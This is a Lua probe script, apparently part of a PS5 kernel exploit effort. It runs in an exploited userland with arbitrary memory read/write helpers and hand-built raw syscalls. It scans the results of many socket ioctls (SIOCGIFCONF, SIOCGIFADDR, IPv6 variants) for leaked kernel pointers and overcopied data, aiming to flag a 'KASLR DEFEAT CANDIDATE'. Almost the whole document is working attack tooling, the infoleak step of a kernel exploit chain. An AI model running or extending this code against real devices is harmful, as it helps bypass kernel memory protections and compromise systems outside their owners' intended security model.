-- CRASH_CLASS: LOW
-- PROBE 69j: SIOC* socket ioctl kernel pointer scan
--
-- Socket ioctls (SIOCGIFCONF, SIOCGIFADDR, etc.) were never tested.
-- These return interface structures with potential kernel pointer leaks
-- in padding or uninitialized fields.

print("=== PROBE 69j: SOCKET IOCTL KASLR ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local pid = N(mk(20)())
print("pid=" .. pid)

-- Fill buffer with sentinel byte
local function fill_sentinel(addr, len)
    for i = 0, len - 1, 4 do
        wd(addr + i, 0xDEDEDEDE)
    end
end

-- Scan buffer for kernel pointers
local function scan_kptrs(addr, len, label)
    local found = 0
    for off = 0, len - 8, 4 do
        local val = rq(addr + off)
        if val then
            local h, l = get_hi_lo(val)
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                print(string.format("  *** KPTR at %s+0x%X: 0x%08X%08X ***", label, off, h, l))
                found = found + 1
            end
        end
    end
    return found
end

-- Scan for modified (non-sentinel) dwords
local function scan_modified(addr, len, label, verbose)
    local modified = 0
    for off = 0, len - 4, 4 do
        local v = rd(addr + off)
        if v and v ~= 0xDEDEDEDE then
            modified = modified + 1
            if verbose and modified <= 16 then
                print(string.format("    +0x%03X: 0x%08X", off, v))
            end
        end
    end
    return modified
end

-- Read interface name from ifreq buffer as string
local function read_ifname(addr)
    local name = ""
    for i = 0, 15 do
        local ok, b = pcall(function() return memory.read_byte(addr + i) end)
        if ok and b and N(b) ~= 0 then
            name = name .. string.char(N(b))
        else
            break
        end
    end
    return name
end

-- Write interface name into ifreq buffer
local function write_ifname(addr, name)
    for i = 0, 15 do
        local ch = 0
        if i < #name then ch = string.byte(name, i + 1) end
        pcall(function() memory.write_byte(addr + i, ch) end)
    end
end

print("")

-- ============================================================
-- [A] Create UDP socket
-- ============================================================
print("[A] Create UDP socket")
local ok_s, sock_v = pcall(function()
    return mk(97)(uint64(2), uint64(2), uint64(0))
end)
local sock = N(sock_v)
print(string.format("  socket(AF_INET, SOCK_DGRAM, 0): ok=%s fd=%d", tostring(ok_s), sock))
if sock < 0 then
    print("  *** Socket creation failed ***")
    print("alive=YES")
    print("=== PROBE 69j COMPLETE ===")
    return
end
print("")

-- ============================================================
-- [B] SIOCGIFCONF — get interface list
-- ============================================================
print("[B] SIOCGIFCONF (0xC0106924)")

-- struct ifconf { int ifc_len; union { caddr_t buf; struct ifreq *req; }; }
-- On FreeBSD/PS5 64-bit: ifc_len at +0, padding, ifc_buf at +8 (pointer)
-- Total struct size: 16 bytes
local ifconf = memory.alloc(16)
local ifbuf = memory.alloc(4096)
fill_sentinel(N(ifbuf), 4096)

wd(N(ifconf), 4096)          -- ifc_len = 4096
wd(N(ifconf) + 4, 0)         -- padding
wq(N(ifconf) + 8, uint64(N(ifbuf)))  -- ifc_buf pointer

local ok_gc, ret_gc = pcall(function()
    return mk(54)(uint64(sock), uint64(0xC0106924), uint64(N(ifconf)))
end)
local ret_gc_v = ok_gc and N(ret_gc) or -999
local used_len = rd(N(ifconf))
print(string.format("  ret=%d ifc_len=%d (bytes used)", ret_gc_v, used_len or 0))

local total_kptrs = 0
local if_names = {}

if ret_gc_v >= 0 and (used_len or 0) > 0 then
    -- Parse ifreq entries (each 32 bytes on FreeBSD: 16 name + 16 sockaddr)
    local IFREQ_SIZE = 32
    local n_ifs = math.floor((used_len or 0) / IFREQ_SIZE)
    print(string.format("  interfaces: %d", n_ifs))

    for i = 0, n_ifs - 1 do
        local base = N(ifbuf) + i * IFREQ_SIZE
        local name = read_ifname(base)
        if #name > 0 then
            if_names[#if_names + 1] = name
        end
        -- Scan this ifreq for kernel pointers
        local kp = scan_kptrs(base, IFREQ_SIZE, name)
        total_kptrs = total_kptrs + kp

        -- Print interface info
        local sa_family = rd(base + 16)
        print(string.format("  [%d] name=%s sa_family=0x%X", i, name, (sa_family or 0) % 256))
    end

    -- Scan entire returned buffer including padding past parsed entries
    print("  Full buffer scan:")
    local full_kp = scan_kptrs(N(ifbuf), used_len or 0, "ifbuf")
    if full_kp == 0 then print("    No kernel pointers") end

    -- Check for data past declared length (overcopy)
    local past_len = used_len or 0
    local extra_modified = 0
    for off = past_len, past_len + 64 - 4, 4 do
        local v = rd(N(ifbuf) + off)
        if v and v ~= 0xDEDEDEDE then extra_modified = extra_modified + 1 end
    end
    if extra_modified > 0 then
        print(string.format("  *** %d dwords modified past ifc_len (overcopy!) ***", extra_modified))
        scan_kptrs(N(ifbuf) + past_len, 64, "ifbuf_overcopy")
    end
else
    print("  SIOCGIFCONF failed or returned 0 bytes")
    -- Fallback: use "lo0" as interface name
    if_names[1] = "lo0"
end
print("")

-- ============================================================
-- [C] Per-interface ioctls
-- ============================================================
print("[C] Per-interface ioctls")

local ioctls = {
    {0xC0206911, "SIOCGIFFLAGS"},
    {0xC0206921, "SIOCGIFADDR"},
    {0xC0206922, "SIOCGIFDSTADDR"},
    {0xC0206923, "SIOCGIFBRDADDR"},
    {0xC0206925, "SIOCGIFNETMASK"},
    {0xC0206933, "SIOCGIFMTU"},
    {0xC0206920, "SIOCGIFINDEX"},
    {0xC0206927, "SIOCGIFHWADDR"},
}

-- Use first interface name, or "lo0" fallback
local test_name = if_names[1] or "lo0"
print(string.format("  Testing with interface: %s", test_name))

-- ifreq is 32 bytes: 16 name + 16 data
local ifreq = memory.alloc(64)

for _, entry in ipairs(ioctls) do
    local cmd = entry[1]
    local name = entry[2]

    -- Initialize entire ifreq with sentinel
    fill_sentinel(N(ifreq), 64)
    -- Write interface name
    write_ifname(N(ifreq), test_name)

    local ok_i, ret_i = pcall(function()
        return mk(54)(uint64(sock), uint64(cmd), uint64(N(ifreq)))
    end)
    local rv = ok_i and N(ret_i) or -999
    if rv >= 0x80000000 then rv = rv - 0x100000000 end

    local mod = scan_modified(N(ifreq), 32, name, false)
    local kp = scan_kptrs(N(ifreq), 64, name)
    total_kptrs = total_kptrs + kp

    local detail = ""
    if rv == 0 and mod > 0 then
        -- Print the data portion (bytes 16-31 of ifreq)
        local d0 = rd(N(ifreq) + 16) or 0
        local d1 = rd(N(ifreq) + 20) or 0
        local d2 = rd(N(ifreq) + 24) or 0
        local d3 = rd(N(ifreq) + 28) or 0
        detail = string.format(" data=[%08X %08X %08X %08X]", d0, d1, d2, d3)
    end

    print(string.format("  %-18s ret=%3d mod=%2d kptr=%d%s", name, rv, mod, kp, detail))
end
print("")

-- ============================================================
-- [D] Try all interface names from SIOCGIFCONF
-- ============================================================
if #if_names > 1 then
    print("[D] Scan all " .. #if_names .. " interfaces")
    for _, ifn in ipairs(if_names) do
        if ifn ~= test_name then
            -- Test SIOCGIFADDR on each additional interface
            fill_sentinel(N(ifreq), 64)
            write_ifname(N(ifreq), ifn)
            local ok_d, ret_d = pcall(function()
                return mk(54)(uint64(sock), uint64(0xC0206921), uint64(N(ifreq)))
            end)
            local rv_d = ok_d and N(ret_d) or -999
            if rv_d >= 0x80000000 then rv_d = rv_d - 0x100000000 end
            local kp_d = scan_kptrs(N(ifreq), 64, ifn)
            total_kptrs = total_kptrs + kp_d

            local mod_d = scan_modified(N(ifreq), 32, ifn, false)
            print(string.format("  %-16s GIFADDR ret=%d mod=%d kptr=%d", ifn, rv_d, mod_d, kp_d))
        end
    end
    print("")
end

-- ============================================================
-- [E] Extended ioctls: SIOCGIFSTAT_IN6, routing, ARP table
-- ============================================================
print("[E] Extended socket ioctls")

local ext_ioctls = {
    {0xC0206935, "SIOCGIFSTATUS"},
    {0xC0206936, "SIOCGIFMEDIA"},
    {0xC0206949, "SIOCGIFPSRCADDR"},
    {0xC020694A, "SIOCGIFPDSTADDR"},
    {0xC0086970, "SIOCGDRVSPEC"},
    {0xC0206919, "SIOCGIFMETRIC"},
}

for _, entry in ipairs(ext_ioctls) do
    local cmd = entry[1]
    local name = entry[2]

    fill_sentinel(N(ifreq), 64)
    write_ifname(N(ifreq), test_name)

    local ok_e, ret_e = pcall(function()
        return mk(54)(uint64(sock), uint64(cmd), uint64(N(ifreq)))
    end)
    local rv = ok_e and N(ret_e) or -999
    if rv >= 0x80000000 then rv = rv - 0x100000000 end

    local mod = scan_modified(N(ifreq), 32, name, false)
    local kp = scan_kptrs(N(ifreq), 64, name)
    total_kptrs = total_kptrs + kp

    print(string.format("  %-18s ret=%3d mod=%d kptr=%d", name, rv, mod, kp))
end
print("")

-- ============================================================
-- [F] Large buffer ioctls: SIOCGIFCONF with big buffer + overcopy
-- ============================================================
print("[F] SIOCGIFCONF large buffer overcopy check")
local big_buf = memory.alloc(8192)
fill_sentinel(N(big_buf), 8192)

local ifconf2 = memory.alloc(16)
wd(N(ifconf2), 8192)
wd(N(ifconf2) + 4, 0)
wq(N(ifconf2) + 8, uint64(N(big_buf)))

local ok_f, ret_f = pcall(function()
    return mk(54)(uint64(sock), uint64(0xC0106924), uint64(N(ifconf2)))
end)
local used2 = rd(N(ifconf2)) or 0
local rv_f = ok_f and N(ret_f) or -999
print(string.format("  ret=%d used=%d", rv_f, used2))

-- Scan entire returned area
local kp_f = scan_kptrs(N(big_buf), used2, "bigbuf")
total_kptrs = total_kptrs + kp_f

-- Check for stale data past used length
local stale_count = 0
for off = used2, math.min(used2 + 256, 8188), 4 do
    local v = rd(N(big_buf) + off)
    if v and v ~= 0xDEDEDEDE and v ~= 0 then
        stale_count = stale_count + 1
        if stale_count <= 4 then
            print(string.format("    STALE at +0x%X: 0x%08X", off, v))
        end
    end
end
if stale_count > 0 then
    print(string.format("  *** %d stale dwords past used length ***", stale_count))
    scan_kptrs(N(big_buf) + used2, 256, "bigbuf_stale")
end
if kp_f == 0 and stale_count == 0 then
    print("  Clean — no kernel pointers, no overcopy")
end
print("")

-- ============================================================
-- [G] IPv6 socket ioctls
-- ============================================================
print("[G] IPv6 socket ioctls")
local ok_s6, sock6_v = pcall(function()
    return mk(97)(uint64(28), uint64(2), uint64(0))  -- AF_INET6=28, SOCK_DGRAM
end)
local sock6 = N(sock6_v)
print(string.format("  socket(AF_INET6, SOCK_DGRAM): fd=%d", sock6))

if sock6 > 0 then
    local v6_ioctls = {
        {0xC0206921, "SIOCGIFADDRv6"},
        {0xC0206925, "SIOCGIFNETMASKv6"},
        {0xC0206911, "SIOCGIFFLAGSv6"},
    }
    for _, entry in ipairs(v6_ioctls) do
        fill_sentinel(N(ifreq), 64)
        write_ifname(N(ifreq), test_name)
        local ok_v6, ret_v6 = pcall(function()
            return mk(54)(uint64(sock6), uint64(entry[1]), uint64(N(ifreq)))
        end)
        local rv6 = ok_v6 and N(ret_v6) or -999
        if rv6 >= 0x80000000 then rv6 = rv6 - 0x100000000 end
        local kp6 = scan_kptrs(N(ifreq), 64, entry[2])
        total_kptrs = total_kptrs + kp6
        print(string.format("  %-18s ret=%3d kptr=%d", entry[2], rv6, kp6))
    end
    pcall(function() mk(6)(uint64(sock6)) end)
end
print("")

-- Cleanup
pcall(function() mk(6)(uint64(sock)) end)

-- ============================================================
-- [H] SUMMARY
-- ============================================================
print("[H] SUMMARY")
print(string.format("  interfaces found: %d", #if_names))
for _, n in ipairs(if_names) do print("    " .. n) end
print(string.format("  total kernel pointers: %d", total_kptrs))

if total_kptrs > 0 then
    print("")
    print("*** KERNEL POINTERS FOUND IN SOCKET IOCTLS ***")
    print("*** KASLR DEFEAT CANDIDATE ***")
else
    print("  All clean — no kernel pointer leaks in socket ioctls")
end

print("")
print("alive=YES")
print("=== PROBE 69j COMPLETE ===")
